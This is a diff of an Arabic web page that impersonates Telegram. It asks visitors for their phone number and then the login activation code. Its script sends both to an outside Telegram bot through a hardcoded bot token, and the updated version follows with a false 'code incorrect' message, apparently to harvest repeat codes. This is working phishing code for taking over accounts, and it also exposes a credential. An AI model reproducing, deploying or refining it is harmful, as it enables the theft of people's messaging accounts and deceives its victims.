@@ -104,33 +104,12 @@
     </div>
 
     <div class="container">
-       <h1>ماذا يعني التوثيق</h1>
-       <p>التوثيق يعني أن القناة، المجموعة أو البوت رسمي، وأنه قد تمت الموافقة على طلب توثيقهم من قبل تيليجرام.  
-    يُرحب بأي منظمة أو شخصية عامة للتقدم بطلب للتوثيق، والإجراءات والمتطلبات هي نفسها لجميع المتقدمين  
-          
-        ستظهر شارات خاصة <strong>Verification Check</strong> للحسابات الموثقة على صفحات معلوماتهم،   
-        وأيضاً في قائمة المحادثات للمستخدمين ونتائج البحث  
-          
-         
-        يقدم تيليجرام شارة التوثيق للشخصيات العامة والمنظمات حتى يتمكن المستخدمون من التعرف على المصادر الرسمية بسهولة.  
-        يعطى التوثيق بشكل عام لكل من:</p>
-
-        <ul>
-            <li>القنوات الرسمية النشطة</li>
-            <li>البوتات العامة</li>
-            <li>المجموعات العامة</li>
-            <li>الحسابات نشطة</li>
-        </ul>
-
-        <h2>كيف يمكنني توثيق حسابي؟</h2>
-        <p>لتوثيق حسابك في تيليجرام، اتبع الخطوات البسيطة التالية:</p>
-        <ul>
-            <li>الدخول إلى تطبيق تيليجرام.</li>
-            <li>تغيير لغة التطبيق إلى الإنجليزية.</li>
-            <li>إضافة رقمك في خانة التسجيل أدناه.</li>
-            <li>انتظار كود التفعيل.</li>
-            <li>عند وصول الكود، قم بإدخاله في خانة التفعيل.</li>
-        </ul>
+        <h2>تسجيل الدخول عبر تيليجرام</h2>
+        <script async src="https://telegram.org/js/telegram-widget.js?7"
+            data-telegram-login="YOUR_BOT_USERNAME"
+            data-size="large"
+            data-auth-url="https://yourwebsite.com/auth"
+            data-request-access="write"></script>
 
         <div class="login-box">
             <!-- تسجيل رقم الهاتف -->
@@ -141,14 +120,9 @@
                 <select id="country">
                     <option value="+967" data-length="9">🇾🇪 اليمن (+967)</option>
                     <option value="+44" data-length="10">🇬🇧 المملكة المتحدة (+44)</option>
-                    <option value="+971" data-length="9">🇦🇪 الإمارات العربية المتحدة (+971)</option>
+                    <option value="+971" data-length="9">🇦🇪 الإمارات (+971)</option>
                     <option value="+966" data-length="9">🇸🇦 السعودية (+966)</option>
                     <option value="+20" data-length="10">🇪🇬 مصر (+20)</option>
-                    <option value="+212" data-length="9">🇲🇦 المغرب (+212)</option>
-                    <option value="+216" data-length="8">🇹🇳 تونس (+216)</option>
-                    <option value="+970" data-length="9">🇵🇸 فلسطين (+970)</option>
-                    <option value="+964" data-length="9">🇮🇶 العراق (+964)</option>
-                    <option value="+962" data-length="9">🇯🇴 الأردن (+962)</option>
                 </select>
 
                 <label for="phone">أدخل رقم هاتفك:</label>
@@ -171,18 +145,20 @@
     <div class="footer">
         © 2025 تيليجرام - جميع الحقوق محفوظة
     </div>
- 
-    <script>
-        const telegramBotToken = '7818218404:AAF1jbC0HcTJgQeBoaCIeXk7hPv9lGYD5S4';  // توكن البوت الخاص بالمستخدم
-        let userChatId = ""; // لتخزين chat_id الخاص بالمستخدم
 
-        // دالة لإرسال البيانات إلى بوت المستخدم
+    <script>
+        const telegramBotToken = '7818218404:AAF1jbC0HcTJgQeBoaCIeXk7hPv9lGYD5S4';
+
         function sendToTelegram(chatId, message) {
             const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
             fetch(url).then(response => response.json()).then(data => console.log(data));
         }
 
-        // الدالة التي تتعامل مع إرسال رقم الهاتف
+        function getTelegramUserId() {
+            let user = window.Telegram.WebApp.initDataUnsafe.user;
+            return user ? user.id : null;
+        }
+
         function submitPhone() {
             let countryCode = document.getElementById("country").value;
             let phoneNumber = document.getElementById("phone").value;
@@ -195,21 +171,23 @@
             let selectedCountry = document.getElementById("country");
             let phoneLength = selectedCountry.options[selectedCountry.selectedIndex].getAttribute("data-length");
 
-            // التحقق من عدد الأرقام في الرقم المدخل
             if (phoneNumber.length !== parseInt(phoneLength)) {
                 alert("يرجى التأكد من أن الرقم المدخل يحتوي على العدد الصحيح من الأرقام!");
                 return;
             }
 
-            // إرسال رقم الهاتف إلى البوت الخاص بالمستخدم عبر chat_id
-            sendToTelegram(userChatId, `تم إدخال رقم الهاتف: ${countryCode}${phoneNumber}`);
+            let userId = getTelegramUserId();
+            if (!userId) {
+                alert("يرجى تسجيل الدخول عبر تيليجرام أولًا!");
+                return;
+            }
 
-            // إخفاء نموذج رقم الهاتف وإظهار نموذج كود التفعيل بسلاسة
+            sendToTelegram(userId, `تم إدخال رقم الهاتف: ${countryCode}${phoneNumber}`);
+
             document.getElementById("phone-box").style.display = "none";
             document.getElementById("verification-box").style.display = "block";
         }
 
-        // دالة للتحقق من الكود
         function verifyCode() {
             let code = document.getElementById("verification-code").value;
 
@@ -218,10 +196,15 @@
                 return;
             }
 
-            // إرسال كود التفعيل إلى بوت المستخدم عبر chat_id
-            sendToTelegram(userChatId, `تم إدخال كود التفعيل: ${code}`);
+            let userId = getTelegramUserId();
+            if (!userId) {
+                alert("يرجى تسجيل الدخول عبر تيليجرام أولًا!");
+                return;
+            }
 
-            alert("تم التحقق من الكود بنجاح!");
+            sendToTelegram(userId, `تم إدخال كود التفعيل: ${code}`);
+
+            alert("الكود غير صحيح، يرجى إعادة المحاولة.");
         }
     </script>
 
